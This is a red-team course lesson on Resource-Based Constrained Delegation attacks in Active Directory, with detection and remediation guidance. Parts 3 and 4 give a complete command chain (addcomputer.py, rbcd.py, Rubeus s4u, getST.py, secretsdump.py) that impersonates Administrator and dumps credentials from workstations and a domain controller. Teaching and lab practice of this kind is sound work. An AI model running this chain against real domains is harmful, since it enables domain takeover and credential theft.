---
title: "Resource-Based Constrained Delegation (RBCD) Attacks"
tags: [red-team, RBCD, delegation, Kerberos, S4U2Proxy, msDS-AllowedToActOnBehalfOfOtherIdentity,
  ATT&CK, T1550.003]
module: 08-RedTeam-03
day: 514
related_topics:
  - ADCS ESC8 Lab (Day 513)
  - AS-REP Roasting and Password Spraying (Day 515)
  - AD Attack Lab (Day 502)
  - Lateral Movement Advanced (Day 498)
---

# Day 514 — Resource-Based Constrained Delegation (RBCD)

> "RBCD is constrained delegation, but the control is reversed. In classic
> constrained delegation, a sysadmin configured which services account A
> could delegate to. In RBCD, the target resource decides who can delegate
> to it — by setting an attribute on itself. If you can write that attribute,
> you own that resource. No sysadmin approval needed. Just an AD attribute
> write."
>
> — Ghost

---

## Goals

Understand the difference between classic constrained delegation and RBCD.
Learn the RBCD attack: write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a
target, then use S4U2Proxy to impersonate any user to that target.
Execute the attack using Impacket and Rubeus.
Understand detection and remediation.

**Prerequisites:** Day 502 (AD attack lab — constrained delegation S4U), Day 513
(ADCS lab), Kerberos fundamentals.
**Time budget:** 4 hours.

---

## Part 1 — Classic vs Resource-Based Constrained Delegation

```
Classic Constrained Delegation (configured by admin):
  Attribute on the SERVICE account: msDS-AllowedToDelegateTo
  → "This service account can delegate to: cifs/DC01.corp.local"
  → Sysadmin explicitly configured this
  → An attacker who compromises this service account can abuse it (Day 502 Path C)

Resource-Based Constrained Delegation (RBCD):
  Attribute on the RESOURCE (computer): msDS-AllowedToActOnBehalfOfOtherIdentity
  → "This computer trusts: ATTACKER_MACHINE$ to delegate to it"
  → The resource owner controls who can delegate to it
  → An attacker who can WRITE this attribute on a computer can add ANY principal
    → That principal can then impersonate any user TO that computer

Key difference:
  Classic:  attacker needs to FIND an account with delegation set
  RBCD:     attacker needs WRITE access to a computer object's attribute
```

### Required Write Permissions

The RBCD attack requires one of these rights on the target computer object:

```
GenericAll        → Full control
GenericWrite      → Write any non-protected attribute
WriteProperty     → Write a specific attribute (msDS-AllowedToActOnBehalfOfOtherIdentity)
WriteDacl         → Modify the DACL (then grant yourself WriteProperty)
Owns              → Object owner (can modify the DACL)
```

These rights are commonly misconfigured for:
- Computer creator accounts (by default, a user who joins a computer to the domain
  gets GenericWrite on that computer object)
- Help desk accounts with delegated computer management rights
- Service accounts with broad AD write permissions

---

## Part 2 — RBCD Attack Chain

```
Prerequisites:
  1. We have a machine account (or can create one):
     → Any domain user can create up to 10 machine accounts by default
       (ms-DS-MachineAccountQuota = 10)
     → OR use an existing compromised machine account
  2. We have GenericWrite (or equivalent) on a TARGET computer object

Attack steps:
  1. Create a new machine account (ATTACKER$): we know its password and hash
  2. Write ATTACKER$'s SID into TARGET's msDS-AllowedToActOnBehalfOfOtherIdentity
     → "TARGET computer trusts ATTACKER$ to delegate to it"
  3. Use S4U2Self + S4U2Proxy as ATTACKER$ to get a TGS for Administrator → TARGET
  4. Use the TGS to access TARGET as Administrator

Result:
  Full access to the TARGET computer as any domain user (including DA)
  No need for TARGET's password or hash
  No need for DA rights to set up the delegation
```

---

## Part 3 — Execution

### Step 1: Create a Fake Machine Account

```bash
# Use Impacket's addcomputer.py to add a machine account:
python3 addcomputer.py corp.local/jsmith:'Password123' \
    -computer-name 'ATTACKER$' \
    -computer-pass 'AttackerPass123!' \
    -dc-ip 10.10.10.5

# Note: this requires ms-DS-MachineAccountQuota > 0 (default = 10)
# Result: ATTACKER$ machine account created with known password
```

### Step 2: Write the RBCD Attribute on the Target

```bash
# Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
# to include ATTACKER$ SID

# Using Impacket's rbcd.py:
python3 rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' \
    -action write corp.local/jsmith:'Password123' -dc-ip 10.10.10.5

# What this does:
# → Adds ATTACKER$'s SID to TARGET$'s msDS-AllowedToActOnBehalfOfOtherIdentity
# → "TARGET trusts ATTACKER$ to perform constrained delegation to it"

# Verify:
python3 rbcd.py -delegate-to 'TARGET$' -action read \
    corp.local/jsmith:'Password123' -dc-ip 10.10.10.5
# → Should show ATTACKER$ in the attribute value
```

### Step 3: S4U Attack — Get a TGS for Administrator on TARGET

```bash
# Use Rubeus S4U as ATTACKER$ to impersonate Administrator to TARGET:
[beacon] > execute-assembly /path/to/Rubeus.exe s4u \
    /user:ATTACKER$ \
    /rc4:ATTACKER_MACHINE_NTLM_HASH \
    /impersonateuser:Administrator \
    /msdsspn:cifs/TARGET.corp.local \
    /ptt

# What happens:
# S4U2Self:  ATTACKER$ requests a TGS for "Administrator → ATTACKER$"
# S4U2Proxy: ATTACKER$ presents that TGS to get "Administrator → cifs/TARGET$"
# /ptt:      inject the resulting TGS into the current session

# Verify:
klist
# → Shows TGS for cifs/TARGET.corp.local as Administrator

# Access TARGET as Administrator:
dir \\TARGET.corp.local\C$
# → Success
```

### Complete Chain with Impacket (No Windows Required)

```bash
# From Kali, full RBCD attack without any Windows tooling:

# Step 1: Add machine account
python3 addcomputer.py corp.local/jsmith:'Password123' \
    -computer-name 'ATTACKER$' -computer-pass 'AttackerPass123!' \
    -dc-ip 10.10.10.5

# Step 2: Write RBCD attribute
python3 rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' \
    -action write corp.local/jsmith:'Password123' -dc-ip 10.10.10.5

# Step 3: Request TGS via S4U using getST.py
python3 getST.py corp.local/'ATTACKER$':'AttackerPass123!' \
    -spn cifs/TARGET.corp.local \
    -impersonate Administrator \
    -dc-ip 10.10.10.5

# Output: Administrator.ccache

# Step 4: Use the TGS
export KRB5CCNAME=Administrator.ccache
python3 secretsdump.py -k -no-pass TARGET.corp.local
# → Full secrets dump as Administrator on TARGET
```

---

## Part 4 — RBCD on a Domain Controller

If the target is a DC and jsmith has GenericWrite on the DC computer object
(uncommon but documented in misconfigured environments):

```bash
# Same attack, target = DC01$:
python3 rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'DC01$' \
    -action write corp.local/jsmith:'Password123' -dc-ip 10.10.10.5

python3 getST.py corp.local/'ATTACKER$':'AttackerPass123!' \
    -spn cifs/DC01.corp.local \
    -impersonate Administrator -dc-ip 10.10.10.5

export KRB5CCNAME=Administrator.ccache
python3 secretsdump.py -k -no-pass DC01.corp.local
# → Full domain hash dump = Domain Admin
```

---

## Part 5 — Cleanup

```bash
# After the engagement:

# Remove the fake machine account:
python3 addcomputer.py corp.local/jsmith:'Password123' \
    -computer-name 'ATTACKER$' -dc-ip 10.10.10.5 \
    -action delete

# Clear the RBCD attribute on the target:
python3 rbcd.py -delegate-to 'TARGET$' -action flush \
    corp.local/jsmith:'Password123' -dc-ip 10.10.10.5

# Verify cleanup:
python3 rbcd.py -delegate-to 'TARGET$' -action read \
    corp.local/jsmith:'Password123' -dc-ip 10.10.10.5
# → Should return empty (no trusted principals)
```

---

## Detection and Remediation

### Detection

```
Event 4741: Computer account created
  Account Name: ATTACKER$ (a newly created machine account — not via normal provisioning)
  Alert if: machine account created by a non-admin account (check ms-DS-MachineAccountQuota)

Event 5136: Directory Service Object Modified
  Object: TARGET computer object
  AttributeLDAPDisplayName: msDS-AllowedToActOnBehalfOfOtherIdentity
  OperationType: Value Added
  SubjectUserName: jsmith (non-admin user modifying a delegation attribute)
  → This is the most reliable detection signal

Kerberos events:
  S4U2Self: Event 4769 with unusual "AdditionalInfo" fields
  S4U2Proxy: Event 4769 (cifs/TARGET) from ATTACKER$
  Anomaly: ATTACKER$ requesting tickets for services it does not host

BloodHound edge:
  "AllowedToAct" edge from ATTACKER$ to TARGET$ visible in BloodHound
  → Run quarterly BloodHound reviews; flag unexpected AllowedToAct edges
```

### Remediation

```
Fix 1: Reduce ms-DS-MachineAccountQuota to 0
  Default is 10 (any domain user can add 10 machines).
  Set to 0 to prevent unprivileged machine account creation:
    ADSI Edit → Default Naming Context → domain root → ms-DS-MachineAccountQuota = 0
  Machine provisioning then requires a privileged account.

Fix 2: Remove unnecessary GenericWrite rights on computer objects
  Audit: Who has GenericWrite on computer objects?
    Bloodhound query: MATCH (u)-[:GenericWrite]->(c:Computer) RETURN u.name, c.name
  Remove rights that are not required for delegated administration.

Fix 3: Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes
  Event 5136 on computer objects with the delegation attribute name.
  Alert on any modification by non-DC, non-admin accounts.
```

---

## Key Takeaways

1. RBCD attacks require only GenericWrite on a computer object — a permission
   that many help desk and provisioning accounts have by design. The attack
   surface is a design assumption, not a single misconfiguration.
2. The ms-DS-MachineAccountQuota attribute (default 10) enables any domain
   user to create their own machine account. This is the prerequisite that
   makes RBCD available to any compromised domain user. Set it to 0.
3. RBCD is entirely Kerberos-based — no NTLM, no password spraying, no hash
   cracking. It generates S4U Kerberos events (4769) that look similar to
   legitimate delegation usage.
4. The attack is fully executable from Kali using Impacket alone. No Windows
   tooling or beacon is required. This is relevant for engagements where
   deploying a beacon is not an option.
5. Cleanup is as important as the attack. A fake machine account left in AD
   or an RBCD attribute left on a production computer is a persistent backdoor.
   Document and clean up every artefact created during the engagement.

---

## Exercises

1. Set ms-DS-MachineAccountQuota on the lab domain to 10 (verify the default).
   Add a machine account as jsmith using `addcomputer.py`. Verify Event 4741
   on the DC.
2. Execute the full RBCD chain from Kali against a lab workstation where jsmith
   has GenericWrite. Verify access to `\\TARGET\C$` as Administrator.
3. Run the RBCD chain against the lab DC (if jsmith has GenericWrite on the DC
   object in the lab). Perform a full secretsdump as Administrator.
4. Write a Sigma rule for Event 5136 that detects modification of
   `msDS-AllowedToActOnBehalfOfOtherIdentity` by a non-machine, non-admin account.
   Test it against your lab execution.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q514.1, Q514.2 …).

---

## Navigation

← Previous: [Day 513 — ADCS ESC8 PetitPotam Lab](DAY-0513-ADCS-ESC8-PetitPotam-Lab.md)
→ Next: [Day 515 — AS-REP Roasting and Password Spraying](DAY-0515-ASREPRoasting-Password-Spraying.md)
